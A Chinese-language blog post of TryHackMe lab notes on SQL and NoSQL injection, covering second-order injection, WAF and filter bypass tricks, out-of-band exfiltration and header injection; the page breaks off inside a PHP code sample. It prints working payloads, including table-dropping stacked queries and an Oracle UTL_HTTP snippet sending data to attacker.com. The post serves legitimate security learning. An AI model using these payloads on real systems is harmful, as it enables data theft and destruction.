<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>[THM]Web Application Pentesting---Injection Attacks  注入攻击 | lan1ocのblog</title><meta name="author" content="lan1oc"><meta name="copyright" content="lan1oc"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="高阶 SQL 注入二次注入原理用户提供的输入被保存并随后在应用程序的不同部分使用，可能在一些初始处理之后。这种类型的攻击更加隐蔽，因为恶意 SQL 代码不需要立即导致 SQL 语法错误或其他明显问题，这使得它更难使用标准输入验证技术进行检测。当数据被检索并在 SQL 命令中使用时，第二次使用数据时，会发生注入 说白了，举个例子，有个更新数据的功能点，你之前添加的那一条数据项是恶意的sql语句，在执">
<meta property="og:type" content="article">
<meta property="og:title" content="[THM]Web Application Pentesting---Injection Attacks  注入攻击">
<meta property="og:url" content="https://lan1oc.github.io/2025/06/18/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/THM/%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9/Injection%20Attacks/index.html">
<meta property="og:site_name" content="lan1ocのblog">
<meta property="og:description" content="高阶 SQL 注入二次注入原理用户提供的输入被保存并随后在应用程序的不同部分使用，可能在一些初始处理之后。这种类型的攻击更加隐蔽，因为恶意 SQL 代码不需要立即导致 SQL 语法错误或其他明显问题，这使得它更难使用标准输入验证技术进行检测。当数据被检索并在 SQL 命令中使用时，第二次使用数据时，会发生注入 说白了，举个例子，有个更新数据的功能点，你之前添加的那一条数据项是恶意的sql语句，在执">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://lan1oc.github.io/img/c1/3.webp">
<meta property="article:published_time" content="2025-06-17T16:00:00.000Z">
<meta property="article:modified_time" content="2025-06-17T16:00:00.000Z">
<meta property="article:author" content="lan1oc">
<meta property="article:tag" content="THM记录">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://lan1oc.github.io/img/c1/3.webp"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "[THM]Web Application Pentesting---Injection Attacks  注入攻击",
  "url": "https://lan1oc.github.io/2025/06/18/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/THM/%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9/Injection%20Attacks/",
  "image": "https://lan1oc.github.io/img/c1/3.webp",
  "datePublished": "2025-06-17T16:00:00.000Z",
  "dateModified": "2025-06-17T16:00:00.000Z",
  "author": [
    {
      "@type": "Person",
      "name": "lan1oc",
      "url": "https://lan1oc.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/1.ico"><link rel="canonical" href="https://lan1oc.github.io/2025/06/18/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/THM/%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9/Injection%20Attacks/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: true,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '[THM]Web Application Pentesting---Injection Attacks  注入攻击',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/4.webp);"></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/c1/3.webp);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">lan1ocのblog</span></a><a class="nav-page-title" href="/"><span class="site-name">[THM]Web Application Pentesting---Injection Attacks  注入攻击</span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">[THM]Web Application Pentesting---Injection Attacks  注入攻击</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-06-17T16:00:00.000Z" title="发表于 2025-06-18 00:00:00">2025-06-18</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-06-17T16:00:00.000Z" title="更新于 2025-06-18 00:00:00">2025-06-18</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AD%A6%E4%B9%A0/">学习</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="高阶-SQL-注入"><a href="#高阶-SQL-注入" class="headerlink" title="高阶 SQL 注入"></a>高阶 SQL 注入</h1><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>用户提供的输入被保存并随后在应用程序的不同部分使用，可能在一些初始处理之后。这种类型的攻击更加隐蔽，因为恶意 SQL 代码不需要立即导致 SQL 语法错误或其他明显问题，这使得它更难使用标准输入验证技术进行检测。当数据被检索并在 SQL 命令中使用时，第二次使用数据时，会发生注入</p>
<p>说白了，举个例子，有个更新数据的功能点，你之前添加的那一条数据项是恶意的sql语句，在执行这个功能后，他会被检索并当作正常sql语句执行，从而导致注入攻击</p>
<h3 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h3><h4 id="将所有书籍的标题更新为-“compromised”"><a href="#将所有书籍的标题更新为-“compromised”" class="headerlink" title="将所有书籍的标题更新为 “compromised”"></a>将所有书籍的标题更新为 “compromised”</h4><p>首先就是有个插入数据的网页<br><img src="/../../../../images/THM/Injection_Attacks/Pasted%20image%2020250619210934.png"><br>先插个数据看看，显示了新插入的数据<br><img src="/../../../../images/THM/Injection_Attacks/Pasted%20image%2020250619211001.png"><br>然后有一个更新数据的网页<br><img src="/../../../../images/THM/Injection_Attacks/Pasted%20image%2020250619211103.png"><br>点击更新的数据包是这样<br><img src="/../../../../images/THM/Injection_Attacks/Pasted%20image%2020250619211200.png"><br>这里看不出啥，从代码层面来分析就是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;update&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$unique_id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;update&#x27;</span>];</span><br><span class="line">    <span class="variable">$ssn</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ssn_&#x27;</span> . <span class="variable">$unique_id</span>];</span><br><span class="line">    <span class="variable">$new_book_name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;new_book_name_&#x27;</span> . <span class="variable">$unique_id</span>];</span><br><span class="line">    <span class="variable">$new_author</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;new_author_&#x27;</span> . <span class="variable">$unique_id</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$update_sql</span> = <span class="string">&quot;UPDATE books SET book_name = &#x27;<span class="subst">$new_book_name</span>&#x27;, author = &#x27;<span class="subst">$new_author</span>&#x27; WHERE ssn = &#x27;<span class="subst">$ssn</span>&#x27;; INSERT INTO logs (page) VALUES (&#x27;update.php&#x27;);&quot;</span>;</span><br></pre></td></tr></table></figure>
<p><code>new_book_name_</code>、<code>new_author_</code>、<code>ssn</code>都可作为注入点<br>再新建个数据测试，就以<code>new_book_name_</code>测试吧</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">114514&#x27;; UPDATE books SET book_name = &#x27;compromised&#x27;; --</span><br></pre></td></tr></table></figure>
<p><img src="/../../../../images/THM/Injection_Attacks/Pasted%20image%2020250619212719.png"><br>添加好以后点击一下更新数据那边的更新按钮<br><img src="/../../../../images/THM/Injection_Attacks/Pasted%20image%2020250619212838.png"></p>
<h4 id="删除表-hello"><a href="#删除表-hello" class="headerlink" title="删除表 hello"></a>删除表 <strong>hello</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">114514&#x27;; drop table `hello`; --</span><br></pre></td></tr></table></figure>
<p><img src="/../../../../images/THM/Injection_Attacks/Pasted%20image%2020250619213035.png"><br>轻微翻车了，被前面那个改书名的注入语句给执行覆盖了，重新来一次，换成作者字段<br><img src="/../../../../images/THM/Injection_Attacks/Pasted%20image%2020250619213208.png"><br>然后再到更新数据的地方点击更新按钮，拿到flag<br><img src="/../../../../images/THM/Injection_Attacks/Pasted%20image%2020250619213257.png"></p>
<h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><h3 id="字符编码"><a href="#字符编码" class="headerlink" title="字符编码"></a>字符编码</h3><ol>
<li><strong>URL 编码</strong></li>
<li><strong>十六进制编码</strong> ：十六进制编码是使用十六进制值构建 SQL 查询的另一种有效技术。例如，查询 <code>SELECT * FROM users WHERE name = &#39;admin&#39;</code> 可以编码为 <code>SELECT * FROM users WHERE name = 0x61646d696e</code> .通过将字符表示为十六进制数字，攻击者可以绕过在处理输入之前不解码这些值的过滤器</li>
<li><code>Unicode 编码</code> ：Unicode 编码表示使用 Unicode 转义序列的字符。例如，字符串 <code>admin</code> 可以编码为 <code>\u0061\u0064\u006d\u0069\u006e</code> .此方法可以绕过仅检查特定 ASCII 字符的过滤器，因为数据库将正确处理编码的输入</li>
</ol>
<h4 id="实践-1"><a href="#实践-1" class="headerlink" title="实践"></a>实践</h4><p>万能密码测试过滤了<code>or</code>和空格<br><img src="/../../../../images/THM/Injection_Attacks/Pasted%20image%2020250619215802.png"><br>那就逻辑运算符<code>||</code>替换<code>or</code>秒了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;||1=1--+</span><br></pre></td></tr></table></figure>
<p><img src="/../../../../images/THM/Injection_Attacks/Pasted%20image%2020250619220032.png"></p>
<h3 id="无引号-SQL-注入"><a href="#无引号-SQL-注入" class="headerlink" title="无引号 SQL 注入"></a>无引号 SQL 注入</h3><ol>
<li><strong>使用 SQL 注释</strong> ：另一种方法涉及使用 SQL 注释来终止查询的其余部分。例如，输入 <code>admin&#39;--</code> 可以转换为 <code>admin--</code>，其中 <code>--</code> 表示 SQL 中注释的开始，从而有效地忽略 SQL 语句的其余部分。这有助于绕过过滤器并防止语法错误</li>
<li><strong>使用 CONCAT（） 函数</strong> ：攻击者可以使用 <code>CONCAT（）</code> 等 SQL 函数来构造不带引号的字符串。例如， <code>CONCAT(0x61, 0x64, 0x6d, 0x69, 0x6e)</code> 构造字符串 admin.<code>CONCAT（）</code> 函数和类似方法允许攻击者在不直接使用引号的情况下构建字符串，从而使过滤器更难检测和阻止有效负载</li>
</ol>
<h3 id="空格被过滤"><a href="#空格被过滤" class="headerlink" title="空格被过滤"></a>空格被过滤</h3><ol>
<li><strong>替换空格的注释</strong> ：一种常见的方法是使用 SQL 注释 （<code>/**/</code>） 来替换空格。例如，攻击者可以使用 <code>SELECT/**//*FROM/**/users/**/WHERE/**/name/**/=&#39;admin&#39;</code> ，而不是 <code>SELECT * FROM users WHERE name = &#39;admin&#39;</code> 。SQL 注释可以替换查询中的空格，从而允许有效负载绕过删除或阻止空格的过滤器</li>
<li><strong>制表符或换行符</strong> ：另一种方法是使用制表符 （<code>\t</code>） 或换行符 （<code>\n</code>） 代替空格。某些筛选器可能允许这些字符，从而使攻击者能够构造类似于 <code>SELECT\t*\tFROM\tusers\tWHERE\tname\t=\t&#39;admin&#39;</code> .此技术可以绕过专门查找空格的筛选器</li>
<li><strong>替代字符</strong> ： 一种有效的方法是使用表示不同类型空格的替代 URL 编码字符，例如 <code>%09</code>（水平制表符）、<code>%0A</code>（换行符）、<code>%0C</code>（换页）、<code>%0D</code>（回车）和 <code>%A0</code>（不间断空格）。这些字符可以替换有效负载中的空格</li>
</ol>
<h3 id="可用于尝试绕过筛选器和-WAF-的各种技术"><a href="#可用于尝试绕过筛选器和-WAF-的各种技术" class="headerlink" title="可用于尝试绕过筛选器和 WAF 的各种技术"></a>可用于尝试绕过筛选器和 WAF 的各种技术</h3><table>
<thead>
<tr>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>** 场景**</td>
<td>** 描述**</td>
<td>** 例**</td>
</tr>
<tr>
<td><strong><br>像 SELECT 这样的关键词被禁止</strong></td>
<td><br>通常可以通过更改大小写或添加内联注释来分解 SQL 关键字</td>
<td>SElEcT * FrOm users or SE&#x2F;**&#x2F;LECT * FROM&#x2F;**&#x2F;users</td>
</tr>
<tr>
<td><strong>禁止使用 Space</strong></td>
<td><br>使用替代空格字符或注释来替换空格有助于绕过过滤器。</td>
<td>SELECT%0A*%0AFROM%0Ausers or SELECT&#x2F;**&#x2F;*&#x2F;**&#x2F;FROM&#x2F;**&#x2F;users  <br></td>
</tr>
<tr>
<td>** <br>禁止使用 AND、OR 等逻辑运算符**</td>
<td><br>使用替代逻辑运算符或串联来绕过关键字筛选器。</td>
<td>username &#x3D; ‘admin’ &amp;&amp; password &#x3D; ‘password’ or username &#x3D; ‘admin’&#x2F;**&#x2F;|&#x2F;**&#x2F;1&#x3D;1 –</td>
</tr>
<tr>
<td>**  <br>UNION、SELECT 等常见关键字被禁止**</td>
<td><br>使用等效表示形式（如十六进制或 Unicode 编码）来绕过筛选器。</td>
<td>SElEcT * FROM users WHERE username &#x3D; CHAR(0x61,0x64,0x6D,0x69,0x6E)</td>
</tr>
<tr>
<td>**  <br>禁止使用 OR、AND、SELECT、UNION 等特定关键字**</td>
<td><br>使用混淆技术通过将字符与字符串函数或注释组合在一起来伪装 SQL 关键字。</td>
<td>SElECT * FROM users WHERE username &#x3D; CONCAT(‘a’,’d’,’m’,’i’,’n’) or SElEcT&#x2F;**&#x2F;username&#x2F;**&#x2F;FROM&#x2F;**&#x2F;users  <br></td>
</tr>
</tbody></table>
<h2 id="带外-SQL-注入（OOB-sql注入）"><a href="#带外-SQL-注入（OOB-sql注入）" class="headerlink" title="带外 SQL 注入（OOB sql注入）"></a>带外 SQL 注入（OOB sql注入）</h2><h3 id="原理与用途"><a href="#原理与用途" class="headerlink" title="原理与用途"></a>原理与用途</h3><p>带外 （OOB） SQL 注入是一种攻击技术，当直接或传统方法无效时，渗透测试人员&#x2F;红队成员使用它来泄露数据或执行恶意作。与攻击者依赖同一通道进行攻击和数据检索的带内 SQL 注入不同，带外 SQL 注入使用单独的通道来发送有效负载和接收响应。带外技术利用 <strong>HTTP</strong> 请求、<strong>DNS</strong> 查询、<strong>SMB</strong> 协议或数据库服务器可能有权访问的其他网络协议等功能，使攻击者能够绕过防火墙、入侵检测系统和其他安全措施</p>
<p>在直接响应被清理或受到安全措施限制的情况下，OOB 通道使攻击者能够在没有服务器立即反馈的情况下泄露数据。例如， <strong>存储过程</strong> 、 <strong>输出编码</strong>和<strong>应用程序级别约束</strong>等安全机制可能会<strong>阻止直接响应</strong> ，从而使传统的 SQL 注入攻击无效。带外技术（例如使用 DNS 或 HTTP 请求）允许将数据发送到由攻击者控制的外部服务器，从而规避这些限制</p>
<p>此外， <strong>入侵检测系统 （IDS）</strong> 和 <strong>Web 应用程序防火墙 （WAF）</strong> 通常会<strong>监控和记录可疑活动的 SQL 查询响应</strong> ，从而阻止来自潜在恶意查询的直接响应。通过利用 OOB 通道，攻击者可以通过使用审查较少的网络协议（ 如 DNS 或 SMB）来传输数据来避免检测。这在攻击者与数据库服务器之间的直接连接受限的网络环境中特别有用，例如当服务器位于防火墙后面或位于不同的网段中时</p>
<h3 id="不同数据库中的技术"><a href="#不同数据库中的技术" class="headerlink" title="不同数据库中的技术"></a>不同数据库中的技术</h3><h4 id="MySQL-和-MariaDB"><a href="#MySQL-和-MariaDB" class="headerlink" title="MySQL 和 MariaDB"></a><strong>MySQL 和 MariaDB</strong></h4><p>可以使用  <a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/select-into.html">SELECT …INTO OUTFILE</a> 或 <a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_load-file">load_file</a> 命令。此命令允许攻击者将查询结果写入服务器文件系统上的文件</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> sensitive_data <span class="keyword">FROM</span> users <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/tmp/out.txt&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>然后，攻击者可以通过数据库服务器上运行的 SMB 共享或 HTTP 服务器访问此文件，从而通过备用通道泄露数据</p>
<h4 id="Microsoft-SQL-Server-（MSSQL）"><a href="#Microsoft-SQL-Server-（MSSQL）" class="headerlink" title="Microsoft SQL Server （MSSQL）"></a><strong>Microsoft SQL Server （MSSQL）</strong></h4><p>可以使用 <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16">xp_cmdshell</a> 等功能执行带外 SQL 注入，该功能允许直接从 SQL 查询执行 shell 命令。这可用于将数据写入可通过网络共享访问的文件</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> xp_cmdshell <span class="string">&#x27;bcp &quot;SELECT sensitive_data FROM users&quot; queryout &quot;\\10.10.58.187\logs\out.txt&quot; -c -T&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>另外， <code>OPENROWSET</code> 或者 <code>BULK INSERT</code> 可用于与外部数据源交互，从而促进通过 OOB 通道进行数据泄露</p>
<h4 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a><strong>Oracle</strong></h4><p>可以使用 <a target="_blank" rel="noopener" href="https://docs.oracle.com/en/database/oracle/oracle-database/19/arpls/UTL_HTTP.html">UTL_HTTP</a> 或 <a target="_blank" rel="noopener" href="https://docs.oracle.com/en/database/oracle/oracle-database/19/arpls/UTL_FILE.html">UTL_FILE</a> 软件包执行带外 SQL 注入。例如，UTL_HTTP 包可用于发送包含敏感数据的 HTTP 请求</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span> </span><br><span class="line">  req  UTL_HTTP.REQ;</span><br><span class="line">  resp UTL_HTTP.RESP;</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">  req  :<span class="operator">=</span> UTL_HTTP.BEGIN_REQUEST(<span class="string">&#x27;http://attacker.com/exfiltrate?sensitive_data=&#x27;</span> <span class="operator">||</span> sensitive_data);</span><br><span class="line">  UTL_HTTP.GET_RESPONSE(req);</span><br><span class="line"><span class="keyword">END</span>;</span><br></pre></td></tr></table></figure>
<h3 id="实践-smb带外"><a href="#实践-smb带外" class="headerlink" title="实践(smb带外)"></a>实践(smb带外)</h3><p>启动<code>smb</code>共享<br><img src="/../../../../images/THM/Injection_Attacks/Pasted%20image%2020250628211711.png"><br>插入payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;; SELECT @@version INTO OUTFILE &#x27;\\\\10.21.170.43\\logs\\out.txt&#x27;; --</span><br></pre></td></tr></table></figure>
<p><img src="/../../../../images/THM/Injection_Attacks/Pasted%20image%2020250628211748.png"><br>然后接收到文件<br><img src="/../../../../images/THM/Injection_Attacks/Pasted%20image%2020250628211633.png"><br>访问网络共享的内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.21.170.43/logs -U guest -N</span><br></pre></td></tr></table></figure>
<p><img src="/../../../../images/THM/Injection_Attacks/Pasted%20image%2020250628212015.png"><br>额权限问题，嗯反正都是自己的服务器，看输出的<code>out.txt</code><br><img src="/../../../../images/THM/Injection_Attacks/Pasted%20image%2020250628212212.png"><br><img src="/../../../../images/THM/Injection_Attacks/Pasted%20image%2020250628212236.png"></p>
<h2 id="其他注入位"><a href="#其他注入位" class="headerlink" title="其他注入位"></a>其他注入位</h2><h3 id="HTTP-协议标头注入"><a href="#HTTP-协议标头注入" class="headerlink" title="HTTP 协议标头注入"></a>HTTP 协议标头注入</h3><ol>
<li><strong>User-Agent</strong>: ‘ OR 1&#x3D;1; –</li>
<li><strong>X-Forwarded-For</strong></li>
<li><strong>Referer</strong></li>
</ol>
<h4 id="实践（UA头注入）"><a href="#实践（UA头注入）" class="headerlink" title="实践（UA头注入）"></a>实践（UA头注入）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;UNION SELECT flag,1 FROM books where book_id = 1; #</span><br></pre></td></tr></table></figure>
<p><img src="/../../../../images/THM/Injection_Attacks/Pasted%20image%2020250628213939.png"></p>
<h2 id="XML-和-JSON-注入"><a href="#XML-和-JSON-注入" class="headerlink" title="XML 和 JSON 注入"></a>XML 和 JSON 注入</h2><p>解析 XML 或 JSON 数据并在 SQL 查询中使用解析数据的应用程序如果未正确清理输入，则可能容易受到注入。XML 和 JSON 注入涉及将恶意数据注入 XML 或 JSON 结构，然后在 SQL 查询中使用这些数据。如果应用程序直接在 SQL 语句中使用解析的值，则可能会发生这种情况</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	&quot;username&quot;: &quot;admin&#x27; OR &#x27;1&#x27;=&#x27;1--&quot;,</span><br><span class="line"></span><br><span class="line">	&quot;password&quot;: &quot;password&quot;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="NOSQL注入"><a href="#NOSQL注入" class="headerlink" title="NOSQL注入"></a>NOSQL注入</h1><p>工作方式与任何其他数据库类似。主要的例外是信息不存储在表中，而是存储在<strong>文档</strong>中</p>
<p>可以将这些文档视为存储键值对的简单字典结构。在某种程度上，它们与传统关系数据库上的记录非常相似，但信息的存储方式不同。例如，假设我们正在为 HR 部门创建一个 Web 应用程序，并且我们希望存储基本的员工信息。然后，您将为每个员工创建一个文档，其中包含格式如下的数据：<br><code>&#123;&quot;_id&quot; : ObjectId(&quot;5f077332de2cdf808d26cd74&quot;), &quot;username&quot; : &quot;lphillips&quot;, &quot;first_name&quot; : &quot;Logan&quot;, &quot;last_name&quot; : &quot;Phillips&quot;, &quot;age&quot; : &quot;65&quot;, &quot;email&quot; : &quot;lphillips@example.com&quot; &#125;</code></p>
<h3 id="Mongo-DB"><a href="#Mongo-DB" class="headerlink" title="Mongo DB"></a>Mongo DB</h3><p><a target="_blank" rel="noopener" href="https://www.mongodb.com/zh-cn/docs/manual/reference/operator/query/">运算符参考</a></p>
<h2 id="运算符注入"><a href="#运算符注入" class="headerlink" title="运算符注入"></a><strong>运算符注入</strong></h2><h3 id="绕过登录页"><a href="#绕过登录页" class="headerlink" title="绕过登录页"></a>绕过登录页</h3><p>网页源码是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$con</span> = <span class="keyword">new</span> MongoDB\Driver\<span class="title function_ invoke__">Manager</span>(<span class="string">&quot;mongodb://localhost:27017&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$user</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">        <span class="variable">$pass</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$q</span> = <span class="keyword">new</span> MongoDB\Driver\<span class="title function_ invoke__">Query</span>([<span class="string">&#x27;username&#x27;</span>=&gt;<span class="variable">$user</span>, <span class="string">&#x27;password&#x27;</span>=&gt;<span class="variable">$pass</span>]);</span><br><span class="line">        <span class="variable">$record</span> = <span class="variable">$con</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="string">&#x27;myapp.login&#x27;</span>, <span class="variable">$q</span> );</span><br><span class="line">        <span class="variable">$record</span> = <span class="title function_ invoke__">iterator_to_array</span>(<span class="variable">$record</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">sizeof</span>(<span class="variable">$record</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="variable">$usr</span> = <span 